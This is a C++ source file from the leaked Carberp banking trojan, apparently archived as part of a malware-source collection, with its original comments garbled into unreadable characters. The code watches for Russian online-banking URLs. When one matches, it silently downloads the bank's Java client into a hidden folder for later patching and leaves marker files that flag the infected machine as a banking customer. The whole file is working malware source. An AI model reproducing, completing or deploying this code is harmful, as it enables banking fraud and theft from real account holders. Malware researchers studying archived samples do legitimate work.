/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#pragma hdrstop

#include "Javaclient2015Saver.h"
//---------------------------------------------------------------------------

#include <windows.h>
#include <shlobj.h>

#include "GetApi.h"
#include "Strings.h"
#include "BotHTTP.h"
#include "HTTPConsts.h"
#include "Utils.h"
#include "java_patcher.h"


#include "BotDebug.h"

namespace JAVACLIENT2015DEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define JAVACL2015DBG JAVACLIENT2015DEBUGSTRINGS::DBGOutMessage<>


class TJavaClientFileData : public TBotObject
{
public:
	TJavaClientFileData() {};
	string TempFileName;
	string FileName;
    string URL;
};


HANDLE Downloadclient2015FileThread = NULL;

// ������� ������ �������� �����
DWORD WINAPI Downloadclient2015File(LPVOID D)
{
	// ��������� ������ ����

    TJavaClientFileData *Data = (TJavaClientFileData*)D;

	PCHAR Document = NULL;

	HRESULT Res = (HRESULT)pURLDownloadToFileA(NULL, Data->URL.t_str(), Data->TempFileName.t_str(), 0, NULL);


	if (Res == S_OK)
		pMoveFileA(Data->TempFileName.t_str(), Data->FileName.t_str());
	else
		pDeleteFileA(Data->TempFileName.t_str());


	delete Data;

    Downloadclient2015FileThread = NULL;

	return 0;
}




void WriteClientFileDomain(PCHAR URL, DWORD Len)
{
	// ���������� ���� � ����
	string FN = GetJavaClient2015FileName();
	if (!FN.IsEmpty())
	{
		File::WriteBufferA(FN.t_str(), URL, Len);
	}
}



//*****************************************************************
//  ������� ��������� ������ �, � ������ ����������� ������ �
//  ������
//  "*/client_ver.js", ��������� ����
//  "http://host_name/client2015.jar" � ��������� ��� � ����
//  %AllUsersProfile%\Application Data\_client2015_orig.jar
//*****************************************************************
void CheckJavaClient2015File(const char *aURL)
{

	// ���� ����� ���� �����������
	// IBANK ������ ��� ����������� ��������� ��
	// ���� ��������� ����
	if (WildCmp((PCHAR)aURL, "*://online.payment.ru/juricvalrur/JuridicalClient.html"))
	{
		File::WriteBufferA(GetPSBSignalFileName().t_str(), NULL, 0);
		return;
    }


    // ��������� ������
	if (Downloadclient2015FileThread)
		return;


	if (!WildCmp((PCHAR)aURL, "*/client_ver.js") &&
		!WildCmp((PCHAR)aURL, "*://ibank2.ru/*"))
		return;


	// ���������� ���� �������� �����
	string Path(MAX_PATH);

	//pGetEnvironmentVariableA("ALLUSERSPROFILE", Path.t_str(), MAX_PATH);
	if( GetJavaPatchWorkFolder( Path.t_str(), "_client2015_orig.jar" ) == 0 ) return;

	Path.CalcLength();

	if (Path.IsEmpty())
		return;

//	Path  += "\\";

	//������ ��������� ��� �����
	string FileName = Path;// + "_client2015_orig.jar";


	if (FileExistsA(FileName.t_str()))
		return;

	TURL URL(aURL);
	if (URL.Host.Hash() == 0xDF8E3E03 /* ibank2.ru */)
		URL.Document = "ibank2client.jar";
	else
		URL.Document =  "client2015.jar";

	TJavaClientFileData *Data = new TJavaClientFileData();

	Data->FileName     = FileName;
	Data->TempFileName = Path + "client2015.tmp";
	Data->URL          = URL.URL();


	Downloadclient2015FileThread = StartThread(Downloadclient2015File, Data);


	string Host = URL.Protocol;
	Host += HTTPProtocolDelimeter;
	Host += URL.Host;

	WriteClientFileDomain(Host.t_str(), Host.Length());

}



//*****************************************************************
// ������� ���������� ��� ����� ���� ����� ������� ���� � ��������
// ����������� ����
//*****************************************************************
string GetJavaClient2015FileName()
{
	return GetSpecialFolderPathA(CSIDL_APPDATA, "jclib25.ini");
}


//*****************************************************************
// ������� ���������� �������� ����� � �������� ������ ������������
// ����
//*****************************************************************
string GetJavaClient2015HostName()
{
	string Host;

	string FN = GetJavaClient2015FileName();

	DWORD Sz = 0;
	PCHAR H = (PCHAR)File::ReadToBufferA(FN.t_str(), Sz);

	if (H)
	{
        Host.Copy(H, 0, Sz);
        MemFree(H);
    }

    return Host;
}



//*****************************************************************
//  GetPSBSignalFileName - ������� ���������� ��� �����������
//						   �����, ������� ��������� ��� ��������
//  ��� ������� PSB - ��������� ����. ���� ���� ����� ��� ������-
//  ������� ��������� ��� ������� �� ��� �������.
//*****************************************************************
string GetPSBSignalFileName()
{
	return GetSpecialFolderPathA(CSIDL_APPDATA, "bcspsb.inf");
}


//*****************************************************************
//  IsPSBSystem - ������� ���������� ������ ���� � ������� �����
//                ���������� ���� PSB
//*****************************************************************
bool IsPSBSystem()
{
	return FileExistsA(GetPSBSignalFileName().t_str());
}
